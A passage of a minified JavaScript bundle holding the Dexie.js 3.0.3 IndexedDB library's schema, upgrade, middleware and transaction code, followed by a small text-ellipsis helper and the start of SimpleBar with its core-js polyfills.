s={name:n,def:o,recreate:!1,del:[],add:[],change:[]};if(""+(r.primKey.keyPath||"")!=""+(o.primKey.keyPath||"")||r.primKey.auto!==o.primKey.auto&&!ke)s.recreate=!0,i.change.push(s);else{var a=r.idxByName,l=o.idxByName,c=void 0;for(c in a)l[c]||s.del.push(c);for(c in l){var u=a[c],d=l[c];u?u.src!==d.src&&s.change.push(d):s.add.push(d)}(0<s.del.length||0<s.add.length||0<s.change.length)&&i.change.push(s)}}else i.add.push([n,o])}return i}function wn(t,e,n,i){var r=t.db.createObjectStore(e,n.keyPath?{keyPath:n.keyPath,autoIncrement:n.auto}:{autoIncrement:n.auto});return i.forEach((function(t){return kn(r,t)})),r}function kn(t,e){t.createIndex(e.name,e.keyPath,{unique:e.unique,multiEntry:e.multi})}function xn(t,e,n){var i={};return m(e.objectStoreNames,0).forEach((function(t){for(var e=n.objectStore(t),r=sn(an(l=e.keyPath),l||"",!1,!1,!!e.autoIncrement,l&&"string"!=typeof l,!0),o=[],s=0;s<e.indexNames.length;++s){var a=e.index(e.indexNames[s]),l=a.keyPath,c=sn(a.name,l,!!a.unique,!!a.multiEntry,!1,l&&"string"!=typeof l,!1);o.push(c)}i[t]=ln(t,r,o)})),i}function _n(t,e,n){for(var i=n.db.objectStoreNames,o=0;o<i.length;++o){var s=i[o],a=n.objectStore(s);t._hasGetAll="getAll"in a;for(var l=0;l<a.indexNames.length;++l){var c,u=a.indexNames[l],d=a.index(u).keyPath,h="string"==typeof d?d:"["+m(d).join("+")+"]";!e[s]||(c=e[s].idxByName[h])&&(c.name=u,delete e[s].idxByName[h],e[s].idxByName[u]=c)}}"undefined"!=typeof navigator&&/Safari/.test(navigator.userAgent)&&!/(Chrome\/|Edge\/)/.test(navigator.userAgent)&&r.WorkerGlobalScope&&r instanceof r.WorkerGlobalScope&&[].concat(navigator.userAgent.match(/Safari\/(\d*)/))[1]<604&&(t._hasGetAll=!1)}var Sn,Cn=($n.prototype._parseStoresSpec=function(t,e){n(t).forEach((function(n){if(null!==t[n]){var r=t[n].split(",").map((function(t,e){var n=(t=t.trim()).replace(/([&*]|\+\+)/g,""),r=/^\[/.test(n)?n.match(/^\[(.*)\]$/)[1].split("+"):n;return sn(n,r||null,/\&/.test(t),/\*/.test(t),/\+\+/.test(t),i(r),0===e)})),o=r.shift();if(o.multi)throw new et.Schema("Primary key cannot be multi-valued");r.forEach((function(t){if(t.auto)throw new et.Schema("Only primary key can be marked as autoIncrement (++)");if(!t.keyPath)throw new et.Schema("Index must have a name and cannot be an empty string")})),e[n]=ln(n,o,r)}}))},$n.prototype.stores=function(t){var e=this.db;this._cfg.storesSource=this._cfg.storesSource?o(this._cfg.storesSource,t):t;var i=e._versions,r={},s={};return i.forEach((function(t){o(r,t._cfg.storesSource),s=t._cfg.dbschema={},t._parseStoresSpec(r,s)})),e._dbSchema=s,vn(e,[e._allTables,e,e.Transaction.prototype]),mn(e,[e._allTables,e,e.Transaction.prototype,this._cfg.tables],n(s),s),e._storeNames=n(s),this},$n.prototype.upgrade=function(t){return this._cfg.contentUpgrade=t,this},$n);function $n(){}function En(t){return ne((function(){return At.letThrough=!0,t()}))}function Tn(t){var e=t._state,i=t._deps.indexedDB;if(e.isBeingOpened||t.idbdb)return e.dbReadyPromise.then((function(){return e.dbOpenError?ge(e.dbOpenError):t}));F&&(e.openCanceller._stackHolder=z()),e.isBeingOpened=!0,e.dbOpenError=null,e.openComplete=!1;var r=e.dbReadyResolve,o=null;return Dt.race([e.openCanceller,new Dt((function(r,s){if(!i)throw new et.MissingAPI("indexedDB API not found. If using IE10+, make sure to run your code on a server URL (not locally). If using old Safari versions, make sure to include indexedDB polyfill.");var a=t.name,l=e.autoSchema?i.open(a):i.open(a,Math.round(10*t.verno));if(!l)throw new et.MissingAPI("IndexedDB API not available");l.onerror=en(s),l.onblocked=Xt(t._fireOnBlocked),l.onupgradeneeded=Xt((function(r){var c,u;o=l.transaction,e.autoSchema&&!t._options.allowEmptyDB?(l.onerror=nn,o.abort(),l.result.close(),(c=i.deleteDatabase(a)).onsuccess=c.onerror=Xt((function(){s(new et.NoSuchDatabase("Database "+a+" doesnt exist"))}))):(o.onerror=en(s),u=r.oldVersion>Math.pow(2,62)?0:r.oldVersion,t.idbdb=l.result,function(t,e,i,r){var o=t._dbSchema,s=t._createTransaction("readwrite",t._storeNames,o);s.create(i),s._completion.catch(r);var a=s._reject.bind(s),l=At.transless||At;ne((function(){var r,c,u,d,h,f,p,g;At.trans=s,At.transless=l,0===e?(n(o).forEach((function(t){wn(i,t,o[t].primKey,o[t].indexes)})),gn(t,i),Dt.follow((function(){return t.on.populate.fire(s)})).catch(a)):(c=e,u=s,d=i,h=[],f=(r=t)._versions,p=r._dbSchema=xn(0,r.idbdb,d),g=!1,f.filter((function(t){return t._cfg.version>=c})).forEach((function(t){h.push((function(){var e=p,i=t._cfg.dbschema;_n(r,e,d),_n(r,i,d),p=r._dbSchema=i;var o=bn(e,i);o.add.forEach((function(t){wn(d,t[0],t[1].primKey,t[1].indexes)})),o.change.forEach((function(t){if(t.recreate)throw new et.Upgrade("Not yet support for changing primary key");var e=d.objectStore(t.name);t.add.forEach((function(t){return kn(e,t)})),t.change.forEach((function(t){e.deleteIndex(t.name),kn(e,t)})),t.del.forEach((function(t){return e.deleteIndex(t)}))}));var s=t._cfg.contentUpgrade;if(s&&t._cfg.version>c){gn(r,d),u._memoizedTables={},g=!0;var a=S(i);o.del.forEach((function(t){a[t]=e[t]})),vn(r,[r.Transaction.prototype]),mn(r,[r.Transaction.prototype],n(a),a),u.schema=a;var l,h=M(s);h&&ie();var f=Dt.follow((function(){var t;(l=s(u))&&h&&(t=re.bind(null,null),l.then(t,t))}));return l&&"function"==typeof l.then?Dt.resolve(l):f.then((function(){return l}))}})),h.push((function(e){g&&xe||function(t,e){for(var n=0;n<e.db.objectStoreNames.length;++n){var i=e.db.objectStoreNames[n];null==t[i]&&e.db.deleteObjectStore(i)}}(t._cfg.dbschema,e),vn(r,[r.Transaction.prototype]),mn(r,[r.Transaction.prototype],r._storeNames,r._dbSchema),u.schema=r._dbSchema}))})),function t(){return h.length?Dt.resolve(h.shift()(u.idbtrans)).then(t):Dt.resolve()}().then((function(){var t,e;e=d,n(t=p).forEach((function(n){e.db.objectStoreNames.contains(n)||wn(e,n,t[n].primKey,t[n].indexes)}))})).catch(a))}))}(t,u/10,o,s))}),s),l.onsuccess=Xt((function(){o=null;var i,s,c,u=t.idbdb=l.result,d=m(u.objectStoreNames);if(0<d.length)try{var h=u.transaction(Je(d),"readonly");e.autoSchema?function(t,e,i){t.verno=e.version/10;var r=t._dbSchema=xn(0,e,i);t._storeNames=m(e.objectStoreNames,0),mn(t,[t._allTables],n(r),r)}(t,u,h):(_n(t,t._dbSchema,h),s=h,((c=bn(xn(0,(i=t).idbdb,s),i._dbSchema)).add.length||c.change.some((function(t){return t.add.length||t.change.length})))&&console.warn("Dexie SchemaDiff: Schema was extended without increasing the number passed to db.version(). Some queries may fail.")),gn(t,h)}catch(i){}we.push(t),u.onversionchange=Xt((function(n){e.vcFired=!0,t.on("versionchange").fire(n)})),Sn.add(a),r()}),s)}))]).then((function(){return e.onReadyBeingFired=[],Dt.resolve(En(t.on.ready.fire)).then((function t(){if(0<e.onReadyBeingFired.length){var n=e.onReadyBeingFired.reduce(ht,rt);return e.onReadyBeingFired=[],Dt.resolve(En(n)).then(t)}}))})).finally((function(){e.onReadyBeingFired=null})).then((function(){return e.isBeingOpened=!1,t})).catch((function(n){try{o&&o.abort()}catch(n){}return e.isBeingOpened=!1,t.close(),e.dbOpenError=n,ge(e.dbOpenError)})).finally((function(){e.openComplete=!0,r()}))}function Ln(t){function e(e){return t.next(e)}var n=o(e),r=o((function(e){return t.throw(e)}));function o(t){return function(e){var o=t(e),s=o.value;return o.done?s:s&&"function"==typeof s.then?s.then(n,r):i(s)?Promise.all(s).then(n,r):n(s)}}return o(e)()}function On(t,e,n){for(var r=i(t)?t.slice():[t],o=0;o<n;++o)r.push(e);return r}var In={stack:"dbcore",name:"VirtualIndexMiddleware",level:1,create:function(e){return t(t({},e),{table:function(n){var i=e.table(n),r=i.schema,o={},s=[];function a(e,n,i){var r=fn(e),l=o[r]=o[r]||[],c=null==e?0:"string"==typeof e?1:e.length,u=0<n,d=t(t({},i),{isVirtual:u,isPrimaryKey:!u&&i.isPrimaryKey,keyTail:n,keyLength:c,extractKey:cn(e),unique:!u&&i.unique});return l.push(d),d.isPrimaryKey||s.push(d),1<c&&a(2===c?e[0]:e.slice(0,c-1),n+1,i),l.sort((function(t,e){return t.keyTail-e.keyTail})),d}var l=a(r.primaryKey.keyPath,0,r.primaryKey);o[":id"]=[l];for(var c=0,u=r.indexes;c<u.length;c++){var d=u[c];a(d.keyPath,0,d)}function h(n){var i,r,o=n.query.index;return o.isVirtual?t(t({},n),{query:{index:o,range:(i=n.query.range,r=o.keyTail,{type:1===i.type?2:i.type,lower:On(i.lower,i.lowerOpen?e.MAX_KEY:e.MIN_KEY,r),lowerOpen:!0,upper:On(i.upper,i.upperOpen?e.MIN_KEY:e.MAX_KEY,r),upperOpen:!0})}}):n}return t(t({},i),{schema:t(t({},r),{primaryKey:l,indexes:s,getIndexByKeyPath:function(t){var e=o[fn(t)];return e&&e[0]}}),count:function(t){return i.count(h(t))},query:function(t){return i.query(h(t))},openCursor:function(t){var n=t.query.index,r=n.keyTail,o=n.isVirtual,s=n.keyLength;if(!o)return i.openCursor(t);return i.openCursor(h(t)).then((function(n){return n&&function(n){return Object.create(n,{continue:{value:function(i){null!=i?n.continue(On(i,t.reverse?e.MAX_KEY:e.MIN_KEY,r)):t.unique?n.continue(On(n.key,t.reverse?e.MIN_KEY:e.MAX_KEY,r)):n.continue()}},continuePrimaryKey:{value:function(t,i){n.continuePrimaryKey(On(t,e.MAX_KEY,r),i)}},key:{get:function(){var t=n.key;return 1===s?t[0]:t.slice(0,s)}},value:{get:function(){return n.value}}})}(n)}))}})}})}},An={stack:"dbcore",name:"HooksMiddleware",level:2,create:function(n){return t(t({},n),{table:function(i){var r=n.table(i),o=r.schema.primaryKey;return t(t({},r),{mutate:function(n){var s=At.trans,a=s.table(i).hook,c=a.deleting,u=a.creating,d=a.updating;switch(n.type){case"add":if(u.fire===rt)break;return s._promise("readwrite",(function(){return h(n)}),!0);case"put":if(u.fire===rt&&d.fire===rt)break;return s._promise("readwrite",(function(){return h(n)}),!0);case"delete":if(c.fire===rt)break;return s._promise("readwrite",(function(){return h(n)}),!0);case"deleteRange":if(c.fire===rt)break;return s._promise("readwrite",(function(){return function e(n,i,s){return r.query({trans:n,values:!1,query:{index:o,range:i},limit:s}).then((function(r){var o=r.result;return h({type:"delete",keys:o,trans:n}).then((function(r){return 0<r.numFailures?Promise.reject(r.failures[0]):o.length<s?{failures:[],numFailures:0,lastResult:void 0}:e(n,t(t({},i),{lower:o[o.length-1],lowerOpen:!0}),s)}))}))}((e=n).trans,e.range,1e4);var e}),!0)}return r.mutate(n);function h(n){var i,s,a,h=At.trans,f=n.keys||un(o,n);if(!f)throw new Error("Keys missing");return"delete"!==(n="add"===n.type||"put"===n.type?t(t({},n),{keys:f,wantResults:!0}):t({},n)).type&&(n.values=e(n.values)),n.keys&&(n.keys=e(n.keys)),i=r,a=f,("add"===(s=n).type?Promise.resolve(new Array(s.values.length)):i.getMany({trans:s.trans,keys:a})).then((function(t){var e=f.map((function(e,i){var r,s,a,f,p=t[i],g={onerror:null,onsuccess:null};return"delete"===n.type?c.fire.call(g,e,p,h):"add"===n.type||void 0===p?(r=u.fire.call(g,e,n.values[i],h),null==e&&null!=r&&(e=r,n.keys[i]=e,o.outbound||x(n.values[i],o.keyPath,e))):(s=N(p,n.values[i]),(a=d.fire.call(g,s,e,p,h))&&(f=n.values[i],Object.keys(a).forEach((function(t){l(f,t)?f[t]=a[t]:x(f,t,a[t])})))),g}));return r.mutate(n).then((function(i){for(var r=i.failures,o=i.results,s=i.numFailures,a=i.lastResult,l=0;l<f.length;++l){var c=o?o[l]:f[l],u=e[l];null==c?u.onerror&&u.onerror(r[l]):u.onsuccess&&u.onsuccess("put"===n.type&&t[l]?n.values[l]:c)}return{failures:r,results:o,numFailures:s,lastResult:a}})).catch((function(t){return e.forEach((function(e){return e.onerror&&e.onerror(t)})),Promise.reject(t)}))}))}}})}})}},Pn=(Nn.prototype.version=function(t){if(isNaN(t)||t<.1)throw new et.Type("Given version is not a positive number");if(t=Math.round(10*t)/10,this.idbdb||this._state.isBeingOpened)throw new et.Schema("Cannot add version when database is open");this.verno=Math.max(this.verno,t);var e=this._versions,n=e.filter((function(e){return e._cfg.version===t}))[0];return n||(n=new this.Version(t),e.push(n),e.sort(yn),n.stores({}),this._state.autoSchema=!1,n)},Nn.prototype._whenReady=function(t){var e=this;return this._state.openComplete||At.letThrough?t():new Dt((function(t,n){if(!e._state.isBeingOpened){if(!e._options.autoOpen)return void n(new et.DatabaseClosed);e.open().catch(rt)}e._state.dbReadyPromise.then(t,n)})).then(t)},Nn.prototype.use=function(t){var e=t.stack,n=t.create,i=t.level,r=t.name;r&&this.unuse({stack:e,name:r});var o=this._middlewares[e]||(this._middlewares[e]=[]);return o.push({stack:e,create:n,level:null==i?10:i,name:r}),o.sort((function(t,e){return t.level-e.level})),this},Nn.prototype.unuse=function(t){var e=t.stack,n=t.name,i=t.create;return e&&this._middlewares[e]&&(this._middlewares[e]=this._middlewares[e].filter((function(t){return i?t.create!==i:!!n&&t.name!==n}))),this},Nn.prototype.open=function(){return Tn(this)},Nn.prototype.close=function(){var t=we.indexOf(this),e=this._state;if(0<=t&&we.splice(t,1),this.idbdb){try{this.idbdb.close()}catch(t){}this.idbdb=null}this._options.autoOpen=!1,e.dbOpenError=new et.DatabaseClosed,e.isBeingOpened&&e.cancelOpen(e.dbOpenError),e.dbReadyPromise=new Dt((function(t){e.dbReadyResolve=t})),e.openCanceller=new Dt((function(t,n){e.cancelOpen=n}))},Nn.prototype.delete=function(){var t=this,e=0<arguments.length,n=this._state;return new Dt((function(i,r){function o(){t.close();var e=t._deps.indexedDB.deleteDatabase(t.name);e.onsuccess=Xt((function(){Sn.remove(t.name),i()})),e.onerror=en(r),e.onblocked=t._fireOnBlocked}if(e)throw new et.InvalidArgument("Arguments not allowed in db.delete()");n.isBeingOpened?n.dbReadyPromise.then(o):o()}))},Nn.prototype.backendDB=function(){return this.idbdb},Nn.prototype.isOpen=function(){return null!==this.idbdb},Nn.prototype.hasBeenClosed=function(){var t=this._state.dbOpenError;return t&&"DatabaseClosed"===t.name},Nn.prototype.hasFailed=function(){return null!==this._state.dbOpenError},Nn.prototype.dynamicallyOpened=function(){return this._state.autoSchema},Object.defineProperty(Nn.prototype,"tables",{get:function(){var t=this;return n(this._allTables).map((function(e){return t._allTables[e]}))},enumerable:!0,configurable:!0}),Nn.prototype.transaction=function(){var t=function(t,e,n){var i=arguments.length;if(i<2)throw new et.InvalidArgument("Too few arguments");for(var r=new Array(i-1);--i;)r[i-1]=arguments[i];return n=r.pop(),[t,$(r),n]}.apply(this,arguments);return this._transaction.apply(this,t)},Nn.prototype._transaction=function(t,e,n){var i=this,r=At.trans;r&&r.db===this&&-1===t.indexOf("!")||(r=null);var o,s,a=-1!==t.indexOf("?");t=t.replace("!","").replace("?","");try{if(s=e.map((function(t){var e=t instanceof i.Table?t.name:t;if("string"!=typeof e)throw new TypeError("Invalid table argument to Dexie.transaction(). Only Table or String are allowed");return e})),"r"==t||t===Ce)o=Ce;else{if("rw"!=t&&t!=$e)throw new et.InvalidArgument("Invalid transaction mode: "+t);o=$e}if(r){if(r.mode===Ce&&o===$e){if(!a)throw new et.SubTransaction("Cannot enter a sub-transaction with READWRITE mode when parent transaction is READONLY");r=null}r&&s.forEach((function(t){if(r&&-1===r.storeNames.indexOf(t)){if(!a)throw new et.SubTransaction("Table "+t+" not included in parent transaction.");r=null}})),a&&r&&!r.active&&(r=null)}}catch(n){return r?r._promise(null,(function(t,e){e(n)})):ge(n)}var l=function(t,e,n,i,r){return Dt.resolve().then((function(){var o=At.transless||At,s=t._createTransaction(e,n,t._dbSchema,i),a={trans:s,transless:o};i?s.idbtrans=i.idbtrans:s.create();var l,c=M(r);c&&ie();var u=Dt.follow((function(){var t;(l=r.call(s,s))&&(c?(t=re.bind(null,null),l.then(t,t)):"function"==typeof l.next&&"function"==typeof l.throw&&(l=Ln(l)))}),a);return(l&&"function"==typeof l.then?Dt.resolve(l).then((function(t){return s.active?t:ge(new et.PrematureCommit("Transaction committed too early. See http://bit.ly/2kdckMn"))})):u.then((function(){return l}))).then((function(t){return i&&s._resolve(),s._completion.then((function(){return t}))})).catch((function(t){return s._reject(t),ge(t)}))}))}.bind(null,this,o,s,r,n);return r?r._promise(o,l,"lock"):At.trans?ce(At.transless,(function(){return i._whenReady(l)})):this._whenReady(l)},Nn.prototype.table=function(t){if(!l(this._allTables,t))throw new et.InvalidTable("Table "+t+" does not exist");return this._allTables[t]},Nn);function Nn(e,n){var i=this;this._middlewares={},this.verno=0;var r=Nn.dependencies;this._options=n=t({addons:Nn.addons,autoOpen:!0,indexedDB:r.indexedDB,IDBKeyRange:r.IDBKeyRange},n),this._deps={indexedDB:n.indexedDB,IDBKeyRange:n.IDBKeyRange};var o=n.addons;this._dbSchema={},this._versions=[],this._storeNames=[],this._allTables={};var s,a,l,c,u,d={dbOpenError:this.idbdb=null,isBeingOpened:!1,onReadyBeingFired:null,openComplete:!1,dbReadyResolve:rt,dbReadyPromise:null,cancelOpen:rt,openCanceller:null,autoSchema:!0};d.dbReadyPromise=new Dt((function(t){d.dbReadyResolve=t})),d.openCanceller=new Dt((function(t,e){d.cancelOpen=e})),this._state=d,this.name=e,this.on=Ae(this,"populate","blocked","versionchange",{ready:[ht,rt]}),this.on.ready.subscribe=v(this.on.ready.subscribe,(function(t){return function(e,n){Nn.vip((function(){var r,o=i._state;o.openComplete?(o.dbOpenError||Dt.resolve().then(e),n&&t(e)):o.onReadyBeingFired?(o.onReadyBeingFired.push(e),n&&t(e)):(t(e),r=i,n||t((function t(){r.on.ready.unsubscribe(e),r.on.ready.unsubscribe(t)})))}))}})),this.Collection=(s=this,Pe(qe.prototype,(function(t,e){this.db=s;var n=Te,i=null;if(e)try{n=e()}catch(t){i=t}var r=t._ctx,o=r.table,a=o.hook.reading.fire;this._ctx={table:o,index:r.index,isPrimKey:!r.index||o.schema.primKey.keyPath&&r.index===o.schema.primKey.name,range:n,keysOnly:!1,dir:"next",unique:"",algorithm:null,filter:null,replayFilter:null,justLimit:!0,isMatch:null,offset:0,limit:1/0,error:i,or:r.or,valueMapper:a!==ot?a:null}}))),this.Table=(a=this,Pe(Oe.prototype,(function(t,e,n){this.db=a,this._tx=n,this.name=t,this.schema=e,this.hook=a._allTables[t]?a._allTables[t].hook:Ae(null,{creating:[lt,rt],reading:[st,ot],updating:[ut,rt],deleting:[ct,rt]})}))),this.Transaction=(l=this,Pe(rn.prototype,(function(t,e,n,i){var r=this;this.db=l,this.mode=t,this.storeNames=e,this.schema=n,this.idbtrans=null,this.on=Ae(this,"complete","error","abort"),this.parent=i||null,this.active=!0,this._reculock=0,this._blockedFuncs=[],this._resolve=null,this._reject=null,this._waitingFor=null,this._waitingQueue=null,this._spinCount=0,this._completion=new Dt((function(t,e){r._resolve=t,r._reject=e})),this._completion.then((function(){r.active=!1,r.on.complete.fire()}),(function(t){var e=r.active;return r.active=!1,r.on.error.fire(t),r.parent?r.parent._reject(t):e&&r.idbtrans&&r.idbtrans.abort(),ge(t)}))}))),this.Version=(c=this,Pe(Cn.prototype,(function(t){this.db=c,this._cfg={version:t,storesSource:null,dbschema:{},tables:{},contentUpgrade:null}}))),this.WhereClause=(u=this,Pe(Ge.prototype,(function(t,e,n){this.db=u,this._ctx={table:t,index:":id"===e?null:e,or:n};var i=u._deps.indexedDB;if(!i)throw new et.MissingAPI("indexedDB API missing");this._cmp=this._ascending=i.cmp.bind(i),this._descending=function(t,e){return i.cmp(e,t)},this._max=function(t,e){return 0<i.cmp(t,e)?t:e},this._min=function(t,e){return i.cmp(t,e)<0?t:e},this._IDBKeyRange=u._deps.IDBKeyRange}))),this.on("versionchange",(function(t){0<t.newVersion?console.warn("Another connection wants to upgrade database '"+i.name+"'. Closing db now to resume the upgrade."):console.warn("Another connection wants to delete database '"+i.name+"'. Closing db now to resume the delete request."),i.close()})),this.on("blocked",(function(t){!t.newVersion||t.newVersion<t.oldVersion?console.warn("Dexie.delete('"+i.name+"') was blocked"):console.warn("Upgrade '"+i.name+"' blocked by other connection holding version "+t.oldVersion/10)})),this._maxKey=tn(n.IDBKeyRange),this._createTransaction=function(t,e,n,r){return new i.Transaction(t,e,n,r)},this._fireOnBlocked=function(t){i.on("blocked").fire(t),we.filter((function(t){return t.name===i.name&&t!==i&&!t._state.vcFired})).map((function(e){return e.on("versionchange").fire(t)}))},this.use(In),this.use(An),o.forEach((function(t){return t(i)}))}var Bn=Pn;return c(Bn,t(t({},it),{delete:function(t){return new Bn(t).delete()},exists:function(t){return new Bn(t,{addons:[]}).open().then((function(t){return t.close(),!0})).catch("NoSuchDatabaseError",(function(){return!1}))},getDatabaseNames:function(t){return Sn?Sn.getDatabaseNames().then(t):Dt.resolve([])},defineClass:function(){return function(t){o(this,t)}},ignoreTransaction:function(t){return At.trans?ce(At.transless,t):t()},vip:En,async:function(t){return function(){try{var e=Ln(t.apply(this,arguments));return e&&"function"==typeof e.then?e:Dt.resolve(e)}catch(e){return ge(e)}}},spawn:function(t,e,n){try{var i=Ln(t.apply(n,e||[]));return i&&"function"==typeof i.then?i:Dt.resolve(i)}catch(t){return ge(t)}},currentTransaction:{get:function(){return At.trans||null}},waitFor:function(t,e){var n=Dt.resolve("function"==typeof t?Bn.ignoreTransaction(t):t).timeout(e||6e4);return At.trans?At.trans.waitFor(n):n},Promise:Dt,debug:{get:function(){return F},set:function(t){q(t,"dexie"===t?function(){return!0}:me)}},derive:h,extend:o,props:c,override:v,Events:Ae,getByKeyPath:k,setByKeyPath:x,delByKeyPath:_,shallowClone:S,deepClone:O,getObjectDiff:N,asap:b,minKey:-1/0,addons:[],connections:we,errnames:J,dependencies:function(){try{return{indexedDB:r.indexedDB||r.mozIndexedDB||r.webkitIndexedDB||r.msIndexedDB,IDBKeyRange:r.IDBKeyRange||r.webkitIDBKeyRange}}catch(t){return{indexedDB:null,IDBKeyRange:null}}}(),semVer:"3.0.3",version:"3.0.3".split(".").map((function(t){return parseInt(t)})).reduce((function(t,e,n){return t+e/Math.pow(10,2*n)})),default:Bn,Dexie:Bn})),Bn.maxKey=tn(Bn.dependencies.IDBKeyRange),function(t){try{(r=(e=t)&&"function"==typeof e.databases)||((i=new Pn(Se,{addons:[]})).version(1).stores({dbnames:"name"}),n=i.table("dbnames")),Sn={getDatabaseNames:function(){return r?Dt.resolve(e.databases()).then((function(t){return t.map((function(t){return t.name})).filter((function(t){return t!==Se}))})):n.toCollection().primaryKeys()},add:function(t){return!r&&t!==Se&&n.put({name:t}).catch(rt)},remove:function(t){return!r&&t!==Se&&n.delete(t).catch(rt)}}}catch(t){}var e,n,i,r}(Pn.dependencies.indexedDB),Dt.rejectionMapper=function(t,e){if(!t||t instanceof X||t instanceof TypeError||t instanceof SyntaxError||!t.name||!nt[t.name])return t;var n=new nt[t.name](e||t.message,t);return"stack"in t&&d(n,"stack",{get:function(){return this.inner.stack}}),n},q(F,me),Pn})),function(t,e){if("function"==typeof define&&define.amd)define(["exports"],e);else if("undefined"!=typeof exports)e(exports);else{var n={exports:{}};e(n.exports),t.ellipsed=n.exports}}(this,(function(t){"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Object.assign||function(t){for(var e=1;e<arguments.length;e++){var n=arguments[e];for(var i in n)Object.prototype.hasOwnProperty.call(n,i)&&(t[i]=n[i])}return t};function n(t,n){var i=t.el,r=t.elStyle,o=t.elHeight,s=t.rowsLimit,a=t.rowsWrapped,l=t.options,c=t.buffer,u=c;if(a===s+1)return e({},t);var d=c,h=a,f=o;return i.innerHTML=u=c.length?""+c+l.delimiter+n+l.replaceStr:""+n+l.replaceStr,parseFloat(r.height)>parseFloat(o)&&(h++,f=r.height,h===s+1)?(i.innerHTML=u="."===d[d.length-1]&&"..."===l.replaceStr?d+"..":""+d+l.replaceStr,e({},t,{elHeight:f,rowsWrapped:h})):(i.innerHTML=u=d.length?""+d+l.delimiter+n:""+n,e({},t,{buffer:u,elHeight:f,rowsWrapped:h}))}t.disableResponsive=function(t){window.removeEventListener("resize",t)},t.ellipsis=function t(){for(var i=arguments.length>0&&void 0!==arguments[0]?arguments[0]:"",r=arguments.length>1&&void 0!==arguments[1]?arguments[1]:1,o=arguments.length>2&&void 0!==arguments[2]?arguments[2]:{},s=e({},{replaceStr:"...",responsive:!1,debounceDelay:250,delimiter:" "},o),a=i&&(i instanceof NodeList?i:1===i.nodeType?[i]:document.querySelectorAll(i)),l=[],c=0;c<a.length;c++){var u=a[c];l[c]=u.innerHTML;var d=u.innerHTML.split(s.delimiter);u.innerHTML="";var h=window.getComputedStyle(u);d.reduce(n,{el:u,buffer:u.innerHTML,elStyle:h,elHeight:0,rowsLimit:r,rowsWrapped:0,options:s})}if(s.responsive){var f=!1,p=window.innerWidth,g=function(){if(window.innerWidth!==p){p=window.innerWidth;for(var n=0;n<a.length;n++)a[n].innerHTML=l[n];t(i,r,e({},o,{responsive:!1}))}},m=function(){clearTimeout(f),f=setTimeout(g,s.debounceDelay)};return window.addEventListener("resize",m),m}}})),function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t=t||self).SimpleBar=e()}(this,(function(){"use strict";var t="undefined"!=typeof globalThis?globalThis:"undefined"!=typeof window?window:"undefined"!=typeof global?global:"undefined"!=typeof self?self:{};function e(t,e){return t(e={exports:{}},e.exports),e.exports}var n,i,r,o="object",s=function(t){return t&&t.Math==Math&&t},a=s(typeof globalThis==o&&globalThis)||s(typeof window==o&&window)||s(typeof self==o&&self)||s(typeof t==o&&t)||Function("return this")(),l=function(t){try{return!!t()}catch(t){return!0}},c=!l((function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})),u={}.propertyIsEnumerable,d=Object.getOwnPropertyDescriptor,h={f:d&&!u.call({1:2},1)?function(t){var e=d(this,t);return!!e&&e.enumerable}:u},f=function(t,e){return{enumerable:!(1&t),configurable:!(2&t),writable:!(4&t),value:e}},p={}.toString,g=function(t){return p.call(t).slice(8,-1)},m="".split,v=l((function(){return!Object("z").propertyIsEnumerable(0)}))?function(t){return"String"==g(t)?m.call(t,""):Object(t)}:Object,y=function(t){if(null==t)throw TypeError("Can't call method on "+t);return t},b=function(t){return v(y(t))},w=function(t){return"object"==typeof t?null!==t:"function"==typeof t},k=function(t,e){if(!w(t))return t;var n,i;if(e&&"function"==typeof(n=t.toString)&&!w(i=n.call(t)))return i;if("function"==typeof(n=t.valueOf)&&!w(i=n.call(t)))return i;if(!e&&"function"==typeof(n=t.toString)&&!w(i=n.call(t)))return i;throw TypeError("Can't convert object to primitive value")},x={}.hasOwnProperty,_=function(t,e){return x.call(t,e)},S=a.document,C=w(S)&&w(S.createElement),$=function(t){return C?S.createElement(t):{}},E=!c&&!l((function(){return 7!=Object.defineProperty($("div"),"a",{get:function(){return 7}}).a})),T=Object.getOwnPropertyDescriptor,L={f:c?T:function(t,e){if(t=b(t),e=k(e,!0),E)try{return T(t,e)}catch(t){}if(_(t,e))return f(!h.f.call(t,e),t[e])}},O=function(t){if(!w(t))throw TypeError(String(t)+" is not an object");return t},I=Object.defineProperty,A={f:c?I:function(t,e,n){if(O(t),e=k(e,!0),O(n),E)try{return I(t,e,n)}catch(t){}if("get"in n||"set"in n)throw TypeError("Accessors not supported");return"value"in n&&(t[e]=n.value),t}},P=c?function(t,e,n){return A.f(t,e,f(1,n))}:function(t,e,n){return t[e]=n,t},N=function(t,e){try{P(a,t,e)}catch(n){a[t]=e}return e},B=e((function(t){var e=a["__core-js_shared__"]||N("__core-js_shared__",{});(t.exports=function(t,n){return e[t]||(e[t]=void 0!==n?n:{})})("versions",[]).push({version:"3.2.1",mode:"global",copyright:"© 2019 Denis Pushkarev (zloirock.ru)"})})),D=B("native-function-to-string",Function.toString),R=a.WeakMap,j="function"==typeof R&&/native code/.test(D.call(R)),M=0,F=Math.random(),q=function(t){return"Symbol("+String(void 0===t?"":t)+")_"+(++M+F).toString(36)},H=B("keys"),W=function(t){return H[t]||(H[t]=q(t))},z={},U=a.WeakMap;if(j){var Z=new U,V=Z.get,K=Z.has,X=Z.set;n=function(t,e){return X.call(Z,t,e),e},i=function(t){return V.call(Z,t)||{}},r=function(t){return K.call(Z,t)}}else{var Y=W("state");z[Y]=!0,n=function(t,e){return P(t,Y,e),e},i=function(t){return _(t,Y)?t[Y]:{}},r=function(t){return _(t,Y)}}var G={set:n,get:i,has:r,enforce:function(t){return r(t)?i(t):n(t,{})},getterFor:function(t){return function(e){var n;if(!w(e)||(n=i(e)).type!==t)throw TypeError("Incompatible receiver, "+t+" required");return n}}},Q=e((function(t){var e=G.get,n=G.enforce,i=String(D).split("toString");B("inspectSource",(function(t){return D.call(t)})),(t.exports=function(t,e,r,o){var s=!!o&&!!o.unsafe,l=!!o&&!!o.enumerable,c=!!o&&!!o.noTargetGet;"function"==typeof r&&("string"!=typeof e||_(r,"name")||P(r,"name",e),n(r).source=i.join("string"==typeof e?e:"")),t!==a?(s?!c&&t[e]&&(l=!0):delete t[e],l?t[e]=r:P(t,e,r)):l?t[e]=r:N(e,r)})(Function.prototype,"toString",(function(){return"function"==typeof this&&e(this).source||D.call(this)}))})),J=a,tt=function(t){return"function"==typeof t?t:void 